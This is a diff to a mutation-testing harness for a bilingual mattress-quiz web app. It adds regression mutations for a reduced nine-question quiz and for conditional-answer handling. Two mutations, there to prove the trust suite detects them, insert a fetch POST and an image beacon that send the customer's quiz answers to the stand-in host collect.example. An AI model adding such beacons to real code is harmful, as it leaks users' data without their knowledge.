@@ -141,6 +141,13 @@ const SESSION = ["tests/session_safety_check.mjs"];
 // entry names it EXPLICITLY - none may fall through to DEFAULT_SUITES, which
 // observes data-error recovery and would report a survivor as a pass.
 const SLEEP = ["tests/sleep_system_presentation_check.mjs"];
+// A4.3 observers: the reduction suite owns the counts, the absence, the
+// Summary retirement and the conditional-answer invariant; the
+// quiz-presentation suite owns navigation and progress; the consultation
+// suite owns the Summary rows and the payload.
+const A43 = ["tests/quiz_reduction_check.mjs"];
+const A43_QUIZ = A43.concat(["tests/quiz_presentation_check.mjs"]);
+const A43_SUMMARY = A43.concat(["tests/consultation_summary_check.mjs"]);
 
 
 // ---------------------------------------------------------------------------
@@ -1221,7 +1228,7 @@ const MUTATIONS = [
     '"en": "This helps us favor pressure relief, support, or a responsive feel."',
     '"en": "This helps us favor pressure relief, support, or a responsive feel, and more."', TRUST, "data/quiz.json"],
   ["trust: a question loses its correspondence section",
-    "### 2. mattress_size", "### 2. mattress_sizes", TRUST, "docs/quiz-copy-engine-correspondence.md"],
+    "### 1. mattress_size", "### 1. mattress_sizes", TRUST, "docs/quiz-copy-engine-correspondence.md"],
   ["trust: the documented inert-tag set drifts from the shipped catalog",
     "`Inert tags: adjustable, comfort,", "`Inert tags: comfort,", TRUST, "docs/quiz-copy-engine-correspondence.md"],
   ["trust: the document cites a mechanism the question does not score",
@@ -1279,12 +1286,15 @@ const MUTATIONS = [
   ["trust: the Review line reverts to the inline claim that the specialist builds the matches",
     "      if (help) help.textContent = t('review.help');",
     "      if (help) help.textContent = 'A quick check, then your specialist builds your recommendations.';", TRUST],
+  // The anchor moved with A4.3: reconcileConditionalAnswers() now runs
+  // between the answer write and the rerender. Same insertion point, same
+  // property - selectOption() must never acquire a network sink.
   ["trust: a third network sink appears (a beacon carrying the answers)",
-    "        answers[qId] = optId;\n      }\n      renderQuestion();",
-    "        answers[qId] = optId;\n      }\n      fetch ('https://collect.example/a', { method: 'POST', body: JSON.stringify(answers) });\n      renderQuestion();", TRUST],
+    "        answers[qId] = optId;\n      }\n      reconcileConditionalAnswers(conditionsBefore);\n      renderQuestion();",
+    "        answers[qId] = optId;\n      }\n      reconcileConditionalAnswers(conditionsBefore);\n      fetch ('https://collect.example/a', { method: 'POST', body: JSON.stringify(answers) });\n      renderQuestion();", TRUST],
   ["trust: a pixel beacon carries the answers to an external host",
-    "        answers[qId] = optId;\n      }\n      renderQuestion();",
-    "        answers[qId] = optId;\n      }\n      document.createElement('img').src = 'https://collect.example/p?a=' + encodeURIComponent(JSON.stringify(answers));\n      renderQuestion();", TRUST],
+    "        answers[qId] = optId;\n      }\n      reconcileConditionalAnswers(conditionsBefore);\n      renderQuestion();",
+    "        answers[qId] = optId;\n      }\n      reconcileConditionalAnswers(conditionsBefore);\n      document.createElement('img').src = 'https://collect.example/p?a=' + encodeURIComponent(JSON.stringify(answers));\n      renderQuestion();", TRUST],
   ["trust: the Spanish data-use variant silently becomes English",
     '"privacy.data_use_preview": "Durante esta sesión en la tienda,',
     '"privacy.data_use_preview": "During this showroom session,', TRUST, "data/dict-es.json"],
@@ -2248,6 +2258,88 @@ const MUTATIONS = [
     "sleepSystemText({ en: 'Add to plan', es: 'Agregar al plan' })) +\n                  '</button>' +\n                '</div>';\n              }).join('')",
     "sleepSystemText({ en: 'Add', es: 'Agregar' })) +\n                  '</button>' +\n                '</div>';\n              }).join('')", SLEEP],
 
+  // --- A4.3 (owner-approved 2026-09-03): the reduced nine-question quiz. The
+  // visit trigger is gone, and with it the Summary's context row. These entries
+  // are the ways the reduction can rot: the question creeping back, a hidden
+  // default, a stale answer restoring the row, an inferred replacement, a blank
+  // row in its place, wrong per-path totals, broken conditional navigation, and
+  // EN/ES drift in the question set.
+  ["quiz reduction: the removed visit-trigger question is reintroduced into the shipped quiz",
+    '      "id": "mattress_size",',
+    '      "id": "trigger",\n      "category": { "en": "Visit", "es": "Visita" },\n      "question": { "en": "What brings you in?", "es": "Que te trae?" },\n      "type": "single",\n      "options": [{ "id": "pain", "label": { "en": "Pain", "es": "Dolor" }, "scores": {} }]\n    },\n    {\n      "id": "mattress_size",',
+    A43, "data/quiz.json"],
+  ["quiz reduction: a hidden default supplies the removed answer in state",
+    "      currentQuestion = 0;\n      answers = {};",
+    "      currentQuestion = 0;\n      answers = { trigger: 'browsing' };",
+    A43],
+  ["quiz reduction: a stale answers.trigger is read back into the Summary payload",
+    "      var ctxParts = [];\n      // Who row: neutral mattress-size identity",
+    "      var ctxParts = [consultImplication('trigger', answers.trigger)].filter(nonEmpty);\n      // Who row: neutral mattress-size identity",
+    A43_SUMMARY],
+  ["quiz reduction: a replacement context is INFERRED from the remaining answers",
+    "      // would be a claim about their visit that no answer supports.\n      var ctxParts = [];",
+    "      // would be a claim about their visit that no answer supports.\n      var ctxParts = [consultImplication('sleep_issues', (answers.sleep_issues || [])[0])].filter(nonEmpty);",
+    A43_SUMMARY],
+  ["quiz reduction: a blank context row is rendered in the retired row's place",
+    '             and read as a missing value. -->\n        <div class="hf2-brief__row" id="hf2BriefWho"></div>',
+    '             and read as a missing value. -->\n        <div class="hf2-brief__row" id="hf2BriefContext"></div>\n        <div class="hf2-brief__row" id="hf2BriefWho"></div>',
+    A43_SUMMARY],
+  ["quiz reduction: the conditional question stops being skipped, so solo sleepers see nine steps",
+    '      "skipIf": {\n        "question": "partner_sleep",\n        "answer": "solo"\n      },',
+    "",
+    A43_QUIZ, "data/quiz.json"],
+  ["quiz reduction: Back stops resolving through visibleQuestions(), so it re-enters the skipped question",
+    "        const vis = visibleQuestions();",
+    "        const vis = QUESTIONS;",
+    A43_QUIZ],
+  ["quiz reduction: a retained question loses its Spanish copy (EN/ES drift at the reduced count)",
+    '        "es": "¿Qué tamaño de colchón buscas?"',
+    '        "es": 12345',
+    A43, "data/quiz.json"],
+  // --- A4.3: the conditional-answer invariant. Editing partner_sleep on the
+  // review used to leave the dependent answer behind: a solo consultation kept
+  // scoring a partner's movement answer, and the reverse edit returned to the
+  // review with the machine's own sentinel standing in for a customer answer.
+  // These seven entries are the ways the ONE rule can be undone - the
+  // reconciler unhooked, the sentinel unwritten, the clear disabled in either
+  // of its two forms, a withdrawn option left standing, and the review's door
+  // check defeated at the door, at the Back control or in the probe itself.
+  ["conditional answers: the reconciler stops running when an answer changes (a stale movement answer outlives the edit)",
+    "      reconcileConditionalAnswers(conditionsBefore);\n      renderQuestion();",
+    "      renderQuestion();",
+    A43],
+  ["conditional answers: the before-snapshot is discarded, so a sentinel is never recognised as machine-written",
+    "      var conditionsBefore = conditionalConditionsHold();",
+    "      var conditionsBefore = null;",
+    A43],
+  ["conditional answers: a machine-written sentinel survives a question becoming askable (solo -> partner finishes on not_applicable)",
+    "          } else if (wasHidden[q.id] === true && answers[q.id] === 'not_applicable') {",
+    "          } else if (false && wasHidden[q.id] === true) {",
+    A43],
+  ["conditional answers: an option withdrawn by hideIf is left standing as the stored answer (a partner-only option keeps scoring for a solo sleeper)",
+    "          } else if (val === opt.id) {\n            delete answers[q.id];\n          }",
+    "          } else if (false) {\n            delete answers[q.id];\n          }",
+    A43],
+  ["conditional answers: the review stops checking for an outstanding conditional answer at its door",
+    "      var pending = pendingConditionalIndex();",
+    "      var pending = -1;",
+    A43],
+  ["conditional answers: Back in edit mode ignores the outstanding question (the Back control goes dead instead of stepping to the trigger)",
+    "      if (editingFromReview && pendingConditionalIndex() < 0) {",
+    "      if (editingFromReview) {",
+    A43],
+  ["conditional answers: the outstanding-question probe never reports anything",
+    "        if (val === undefined || val === null || val === '') return i;",
+    "        if (false) return i;",
+    A43],
+  // The living-contract half: the counts the principal guides state are pinned
+  // FROM data/quiz.json by the reduction suite, so this entry proves the pin is
+  // load-bearing rather than decorative.
+  ["living contract: a principal guide keeps the old question and option counts after a reduction",
+    "The 9 quiz questions (42 options;",
+    "The 10 quiz questions (47 options;",
+    A43, "CLAUDE.md"],
+
 ];
 
 // ---------------------------------------------------------------------------
@@ -2264,12 +2356,16 @@ process.on("exit", () => { try { rmSync(sandbox, { recursive: true, force: true 
 // demo would otherwise be unreachable from this sandbox.
 // `.github` joins the copy set because the pricing contract suite pins that
 // CI's operating-state lock names pricing.displayEnabled.
-for (const d of ["tests", "data", "docs", "tools", "incoming", "demo", ".github"]) {
+// `onboarding` joins the copy set because the A4.3 living-contract section
+// pins the question and option counts stated in the two onboarding guides.
+for (const d of ["tests", "data", "docs", "tools", "incoming", "demo", ".github", "onboarding"]) {
   cpSync(join(root, d), join(sandbox, d), { recursive: true });
 }
 // CLAUDE.md joins the copy set because the trust suite pins that it carries no
 // paragraph legitimizing retailer prose in the quiz contract.
-for (const f of ["index.html", "Code.gs", "CLAUDE.md"]) cpSync(join(root, f), join(sandbox, f));
+// README.md joins the copy set for the same reason as onboarding: the A4.3
+// living-contract section reads the counts it states.
+for (const f of ["index.html", "Code.gs", "CLAUDE.md", "README.md"]) cpSync(join(root, f), join(sandbox, f));
 
 // Per-target pristine sources. Entries name their target with a fifth field;
 // index.html is the default. Every mutated target is restored before the next
@@ -2295,6 +2391,10 @@ const PRISTINE_BY_FILE = {
   // `experience` bypass shipped green.
   "tools/validation.py":
     readFileSync(join(sandbox, "tools", "validation.py"), "utf8"),
+  // A4.3: the living nine-question contract. The quiz-reduction suite reads
+  // the counts stated in the principal guides and compares them to
+  // data/quiz.json, so CLAUDE.md is a mutation target like any other source.
+  "CLAUDE.md": readFileSync(join(sandbox, "CLAUDE.md"), "utf8"),
   // Trust gate: the generated quiz copy and the correspondence document that
   // governs it. Mutating each proves the suite compares them rather than
   // trusting either.
